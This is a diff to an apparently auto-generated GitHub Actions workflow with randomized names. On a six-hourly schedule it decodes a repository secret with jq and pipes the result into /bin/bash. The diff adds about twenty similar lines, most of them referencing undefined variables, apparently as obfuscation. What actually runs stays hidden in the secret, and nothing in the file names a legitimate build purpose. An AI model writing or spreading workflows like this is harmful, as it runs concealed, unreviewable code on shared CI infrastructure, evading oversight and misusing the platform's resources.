@@ -1,31 +1,40 @@
 name: zhaowushi4178
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 5/6 * * *'
+    - cron: '52 5/6 * * *'
 
-jobs:  # 5758
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhaowushi4178
         env:
-          m2: ${{ secrets.m2 }}
+          v13: ${{ secrets.v13 }}
         run: |
-          echo $m2 | jq -r .pdm726 | /bin/bash
-          echo $ygq68608 | jq -r .kxp06 | /bin/bash
-          echo $oscnr6 | jq -r .wyd41300 | /bin/bash
-          echo $y322 | jq -r .uixb1 | /bin/bash
-          echo $m87 | jq -r .a6 | /bin/bash
-          echo $u10 | jq -r .etb7 | /bin/bash
-          echo $fl0 | jq -r .uxy36 | /bin/bash
-          echo $n7040 | jq -r .fo32 | /bin/bash
-          echo $y5624 | jq -r .jazh534 | /bin/bash
-          echo $wcue55071 | jq -r .usfp5980 | /bin/bash
-          echo $kwfl392 | jq -r .vj41424 | /bin/bash
-          echo $zyl75976 | jq -r .ov79944 | /bin/bash
-          echo $emlz41 | jq -r .elk46294 | /bin/bash
-          echo $r246 | jq -r .zfrdk48 | /bin/bash
-          echo $r2945 | jq -r .m363 | /bin/bash
+          echo $v13 | jq -r .t3842 | /bin/bash
+          echo $rqn6860 | jq -r .thb50 | /bin/bash
+          echo $b7902 | jq -r .zpohw5 | /bin/bash
+          echo $i60175 | jq -r .he372 | /bin/bash
+          echo $os00 | jq -r .bw0400 | /bin/bash
+          echo $f884 | jq -r .ta97008 | /bin/bash
+          echo $qs79585 | jq -r .knh0 | /bin/bash
+          echo $k4142 | jq -r .oy72 | /bin/bash
+          echo $c44 | jq -r .onik223 | /bin/bash
+          echo $mnw6 | jq -r .tvjx5592 | /bin/bash
+          echo $gaw16203 | jq -r .bfj85947 | /bin/bash
+          echo $rsoao467 | jq -r .xnw9 | /bin/bash
+          echo $acor62677 | jq -r .boozd007 | /bin/bash
+          echo $s30132 | jq -r .xdch991 | /bin/bash
+          echo $mcy7760 | jq -r .dqb0220 | /bin/bash
+          echo $wxe0641 | jq -r .jmodl2333 | /bin/bash
+          echo $uauti33 | jq -r .dvf62555 | /bin/bash
+          echo $x7208 | jq -r .am127 | /bin/bash
+          echo $fy20 | jq -r .bsp9703 | /bin/bash
+          echo $qh642 | jq -r .vcpg098 | /bin/bash
+          echo $bshoz0 | jq -r .mgciy64621 | /bin/bash
+          echo $soc783 | jq -r .pkbqe3 | /bin/bash
 
